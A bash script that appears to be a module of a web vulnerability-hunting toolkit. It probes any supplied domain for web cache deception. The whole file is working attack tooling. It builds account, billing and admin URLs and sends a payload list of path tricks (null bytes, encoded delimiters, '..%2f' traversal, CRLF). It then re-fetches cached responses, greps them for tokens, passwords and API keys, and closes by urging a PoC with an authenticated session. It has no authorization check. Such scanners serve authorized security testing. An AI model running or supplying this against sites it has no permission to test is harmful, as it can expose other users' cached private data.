#!/usr/bin/env bash
# ╔══════════════════════════════════════════════════════════════╗
# ║  ct_cache_deception.sh — Web Cache Deception                  ║
# ║  Path confusion + extension tricks to cache authenticated     ║
# ║  responses as static content                                  ║
# ╚══════════════════════════════════════════════════════════════╝
set -uo pipefail

SCRIPT_NAME="ct_cache_deception.sh"
SCRIPT_DESC="Web Cache Deception"

script_usage() {
    echo "Usage: ${SCRIPT_NAME} [OPTIONS]"
    echo ""
    echo "  Test for web cache deception by appending static extensions,"
    echo "  path normalization tricks, and delimiter confusion to URLs that"
    echo "  may serve authenticated content."
    echo ""
    echo "Options:"
    echo "  -d, --domain DOMAIN    Target domain"
    echo "  --domains FILE         File with domains (one per line)"
    echo "  -u, --urls FILE        File with URLs to test (one per line)"
    echo "  -o, --out DIR          Output directory (default: ./out)"
    echo "  -t, --threads N        Concurrency (default: 30)"
    echo "  -h, --help             Show this help"
}

LIB_DIR="$(cd "$(dirname "$0")/.." && pwd)"
source "${LIB_DIR}/lib.sh"
parse_common_args "$@"

phase_header "3" "$SCRIPT_DESC"

if [ -z "${DOMAIN:-}" ] && [ -z "${DOMAINS_FILE:-}" ] && [ -z "${URLS_FILE:-}" ]; then
    err "Provide --domain, --domains, or --urls"
    script_usage
    exit 1
fi

# ── Build target URL list ─────────────────────────────────────
TARGET_URLS="${OUT_DIR}/_ct_deception_targets.txt"
> "$TARGET_URLS"

# Common auth-adjacent paths that may serve user-specific data
AUTH_PATHS=(
    "/account" "/profile" "/settings" "/dashboard"
    "/user" "/me" "/my" "/my-account"
    "/api/user" "/api/me" "/api/profile" "/api/account"
    "/home" "/preferences" "/notifications"
    "/billing" "/orders" "/cart"
    "/admin" "/panel" "/console"
)

if [ -n "${URLS_FILE:-}" ] && [ -f "$URLS_FILE" ]; then
    head -50 "$URLS_FILE" >> "$TARGET_URLS"
fi

# Add auth paths for each domain
build_auth_urls() {
    local domain="$1"
    for path in "${AUTH_PATHS[@]}"; do
        echo "https://${domain}${path}" >> "$TARGET_URLS"
    done
}

if [ -n "${DOMAINS_FILE:-}" ] && [ -f "$DOMAINS_FILE" ]; then
    while IFS= read -r d; do
        [ -z "$d" ] && continue
        d=$(echo "$d" | sed 's/\*\.//')
        build_auth_urls "$d"
    done < "$DOMAINS_FILE"
elif [ -n "${DOMAIN:-}" ]; then
    build_auth_urls "$(echo "$DOMAIN" | sed 's/\*\.//')"
fi

sort -u -o "$TARGET_URLS" "$TARGET_URLS"
url_count=$(count_lines "$TARGET_URLS")
info "Testing ${url_count} URLs for cache deception"

# ── Output file ───────────────────────────────────────────────
FINDINGS_FILE="${OUT_DIR}/ct_cache_deception_findings.txt"
> "$FINDINGS_FILE"

# ── Static file extensions for cache deception ────────────────
STATIC_EXTENSIONS=(".css" ".js" ".png" ".jpg" ".gif" ".svg" ".ico" ".woff" ".woff2" ".ttf" ".avif" ".webp")

# ── Path normalization / delimiter tricks ─────────────────────
# Each trick appends to the base path
PATH_TRICKS=(
    # Extension appending (handled separately per extension)
    # Null byte before extension
    "%00.css"
    "%00.js"
    "%00.png"
    # Semicolon delimiter
    ";.css"
    ";.js"
    ";.png"
    ";bypass.css"
    # Dot-segment normalization
    "/.css"
    "/.js"
    "/.png"
    # Fragment injection (URL-encoded #)
    "%23.css"
    "%23.js"
    # Query string confusion (URL-encoded ?)
    "%3f.css"
    "%3f.js"
    # Double encoding
    "%252e.css"
    "%252e.js"
    # Path traversal with static suffix
    "/..%2f..%2fstatic.css"
    "/..%2fstatic.js"
    "/../static/anything.css"
    # Backslash normalization (IIS)
    "%5c.css"
    "%5c.js"
    # Multiple dots
    "..css"
    "..js"
    # newline injection
    "%0a.css"
    "%0d%0a.css"
)

# ── Sensitive data patterns to detect in responses ────────────
# These indicate authenticated/personalized content was returned
SENSITIVE_PATTERNS='(email.*@|"user"|"username"|"account"|"token"|"session"|"password"|"api[_-]?key"|"secret"|"balance"|"credit"|"phone"|"address"|"billing"|logged.in|sign.out|logout|my.account|welcome.back|dashboard)'

# ── Helper: check if response contains sensitive data ─────────
has_sensitive_data() {
    local body="$1"
    if echo "$body" | grep -qiP "$SENSITIVE_PATTERNS"; then
        return 0
    fi
    return 1
}

# ── Helper: check cache status ────────────────────────────────
is_cached() {
    local headers="$1"
    if echo "$headers" | grep -qiP '(x-cache.*hit|cf-cache-status.*hit|x-cache-hits:[[:space:]]*[1-9]|cache-status.*hit|age:[[:space:]]*[1-9])'; then
        return 0
    fi
    return 1
}

# ── Helper: extract content type ──────────────────────────────
get_content_type() {
    local headers="$1"
    echo "$headers" | grep -i '^content-type:' | head -1 | sed 's/^[^:]*:[[:space:]]*//' | tr -d '\r'
}

# ── Main deception testing loop ──────────────────────────────
tested=0
findings=0

while IFS= read -r base_url; do
    [ -z "$base_url" ] && continue
    ((tested++)) || true

    # ── Baseline request: get normal response ──
    baseline_resp=$(curl -sk -D- --connect-timeout 8 --max-time 15 \
        "${HUNT_UA_CURL[@]}" "$base_url" 2>/dev/null || echo "")

    if [ -z "$baseline_resp" ]; then
        continue
    fi

    baseline_status=$(echo "$baseline_resp" | head -1 | grep -oP '\d{3}' | head -1)
    [ -z "$baseline_status" ] && continue

    # Skip non-responsive or error pages
    if [[ "$baseline_status" =~ ^(000|502|503|504)$ ]]; then
        continue
    fi

    baseline_headers=$(echo "$baseline_resp" | sed '/^\r$/q')
    baseline_body=$(echo "$baseline_resp" | sed '1,/^\r$/d')
    baseline_ct=$(get_content_type "$baseline_headers")
    baseline_size=${#baseline_body}

    info "[${tested}/${url_count}] ${base_url} (HTTP ${baseline_status}, ${baseline_size}b)"

    # ── Test 1: Direct extension appending ──
    for ext in "${STATIC_EXTENSIONS[@]}"; do
        # Strip trailing slash if present
        clean_url="${base_url%/}"
        test_url="${clean_url}${ext}"

        resp=$(curl -sk -D- --connect-timeout 8 --max-time 15 \
            "${HUNT_UA_CURL[@]}" "$test_url" 2>/dev/null || echo "")
        [ -z "$resp" ] && continue

        resp_status=$(echo "$resp" | head -1 | grep -oP '\d{3}' | head -1)
        [ -z "$resp_status" ] && continue

        resp_headers=$(echo "$resp" | sed '/^\r$/q')
        resp_body=$(echo "$resp" | sed '1,/^\r$/d')
        resp_ct=$(get_content_type "$resp_headers")
        resp_size=${#resp_body}

        # Check for deception indicators:
        # 1. Response returns 200 with similar content to baseline
        # 2. Content-Type mismatch (HTML served as CSS/JS)
        # 3. Cache considers it cacheable (HIT or MISS)

        if [ "$resp_status" = "200" ] && [ "$resp_size" -gt 100 ]; then
            ct_mismatch=0
            if echo "$resp_ct" | grep -qi 'text/html\|application/json' && echo "$ext" | grep -qP '\.(css|js|png|jpg|gif|svg|ico|woff)'; then
                ct_mismatch=1
            fi

            cached=0
            if is_cached "$resp_headers"; then
                cached=1
            fi

            # Check if response body looks like the original (not a 404 page)
            similar=0
            if [ "$resp_size" -gt $(( baseline_size / 2 )) ] 2>/dev/null; then
                similar=1
            fi

            if [ "$ct_mismatch" -eq 1 ] && [ "$cached" -eq 1 ]; then
                echo "[CRITICAL] CACHE DECEPTION: ${test_url} | CT: ${resp_ct} | Cached: YES | Size: ${resp_size}" >> "$FINDINGS_FILE"
                warn "  ${RED}[CRITICAL]${NC} ${test_url} — HTML served as ${ext}, CACHED"
                ((findings++)) || true
            elif [ "$ct_mismatch" -eq 1 ] && [ "$similar" -eq 1 ]; then
                echo "[HIGH] POTENTIAL DECEPTION: ${test_url} | CT: ${resp_ct} | Similar: YES | Size: ${resp_size}" >> "$FINDINGS_FILE"
                log "  ${YELLOW}[HIGH]${NC} ${test_url} — HTML served as ${ext}"
                ((findings++)) || true
            elif [ "$cached" -eq 1 ] && [ "$similar" -eq 1 ]; then
                echo "[MEDIUM] CACHED AUTH PATH: ${test_url} | CT: ${resp_ct} | Cached: YES | Size: ${resp_size}" >> "$FINDINGS_FILE"
                ((findings++)) || true
            fi

            # Second request: check if cached for other users
            if [ "$ct_mismatch" -eq 1 ] || [ "$cached" -eq 1 ]; then
                sleep 1
                resp2=$(curl -sk -D- --connect-timeout 8 --max-time 15 \
                    "${HUNT_UA_CURL[@]}" "$test_url" 2>/dev/null || echo "")
                if [ -n "$resp2" ]; then
                    resp2_headers=$(echo "$resp2" | sed '/^\r$/q')
                    if is_cached "$resp2_headers"; then
                        resp2_body=$(echo "$resp2" | sed '1,/^\r$/d')
                        if has_sensitive_data "$resp2_body"; then
                            echo "[CRITICAL] CONFIRMED DECEPTION+SENSITIVE DATA: ${test_url}" >> "$FINDINGS_FILE"
                            warn "  ${RED}[CRITICAL] CONFIRMED${NC}: ${test_url} serves cached sensitive data"
                        fi
                    fi
                fi
            fi
        fi
    done

    # ── Test 2: Path normalization tricks ──
    clean_url="${base_url%/}"
    for trick in "${PATH_TRICKS[@]}"; do
        test_url="${clean_url}${trick}"

        resp=$(curl -sk -D- --connect-timeout 8 --max-time 15 \
            "${HUNT_UA_CURL[@]}" "$test_url" 2>/dev/null || echo "")
        [ -z "$resp" ] && continue

        resp_status=$(echo "$resp" | head -1 | grep -oP '\d{3}' | head -1)
        [ -z "$resp_status" ] && continue

        resp_headers=$(echo "$resp" | sed '/^\r$/q')
        resp_body=$(echo "$resp" | sed '1,/^\r$/d')
        resp_ct=$(get_content_type "$resp_headers")
        resp_size=${#resp_body}

        if [ "$resp_status" = "200" ] && [ "$resp_size" -gt 100 ]; then
            cached=0
            is_cached "$resp_headers" && cached=1

            ct_mismatch=0
            if echo "$resp_ct" | grep -qi 'text/html\|application/json'; then
                ct_mismatch=1
            fi

            similar=0
            if [ "$resp_size" -gt $(( baseline_size / 2 )) ] 2>/dev/null; then
                similar=1
            fi

            if [ "$cached" -eq 1 ] && [ "$ct_mismatch" -eq 1 ] && [ "$similar" -eq 1 ]; then
                echo "[HIGH] PATH TRICK CACHED: ${test_url} | Trick: ${trick} | CT: ${resp_ct} | Cached: YES" >> "$FINDINGS_FILE"
                warn "  ${YELLOW}[HIGH]${NC} ${test_url} — path trick ${trick} cached with HTML content"
                ((findings++)) || true
            elif [ "$similar" -eq 1 ] && [ "$ct_mismatch" -eq 1 ]; then
                echo "[MEDIUM] PATH TRICK REFLECTION: ${test_url} | Trick: ${trick} | CT: ${resp_ct}" >> "$FINDINGS_FILE"
                ((findings++)) || true
            fi
        fi
    done

    # ── Test 3: Path parameter injection (RPO style) ──
    # /profile/nonexistent.css — some frameworks treat extra path segments as params
    for ext in ".css" ".js" ".png"; do
        test_url="${clean_url}/nonexistent${ext}"
        resp=$(curl -sk -D- --connect-timeout 8 --max-time 15 \
            "${HUNT_UA_CURL[@]}" "$test_url" 2>/dev/null || echo "")
        [ -z "$resp" ] && continue

        resp_status=$(echo "$resp" | head -1 | grep -oP '\d{3}' | head -1)
        resp_headers=$(echo "$resp" | sed '/^\r$/q')
        resp_body=$(echo "$resp" | sed '1,/^\r$/d')
        resp_size=${#resp_body}

        if [ "$resp_status" = "200" ] && [ "$resp_size" -gt 100 ]; then
            similar=0
            [ "$resp_size" -gt $(( baseline_size / 2 )) ] 2>/dev/null && similar=1

            if [ "$similar" -eq 1 ]; then
                cached=0
                is_cached "$resp_headers" && cached=1

                severity="MEDIUM"
                [ "$cached" -eq 1 ] && severity="HIGH"

                echo "[${severity}] RPO PATH: ${test_url} | Size: ${resp_size} | Cached: $([ "$cached" -eq 1 ] && echo YES || echo NO)" >> "$FINDINGS_FILE"
                log "  ${YELLOW}[${severity}]${NC} ${test_url} — serves parent content"
                ((findings++)) || true
            fi
        fi
    done

done < "$TARGET_URLS"

# ── Cleanup ───────────────────────────────────────────────────
rm -f "$TARGET_URLS"

# ── Summary ───────────────────────────────────────────────────
if [ -s "$FINDINGS_FILE" ]; then
    sort -u -o "$FINDINGS_FILE" "$FINDINGS_FILE"
fi
finding_count=$(count_lines "$FINDINGS_FILE")
critical_count=$(grep -c '^\[CRITICAL\]' "$FINDINGS_FILE" 2>/dev/null || echo 0)
high_count=$(grep -c '^\[HIGH\]' "$FINDINGS_FILE" 2>/dev/null || echo 0)
medium_count=$(grep -c '^\[MEDIUM\]' "$FINDINGS_FILE" 2>/dev/null || echo 0)

log "Cache deception: ${finding_count} total findings"
log "  CRITICAL (confirmed deception+data): ${critical_count}"
log "  HIGH (extension trick + cached):     ${high_count}"
log "  MEDIUM (potential deception):        ${medium_count}"
log "Tested ${tested} base URLs"
if [ "$critical_count" -gt 0 ]; then
    warn "Confirmed cache deception found — prepare PoC with authenticated session"
fi
log "Results: ${FINDINGS_FILE}"
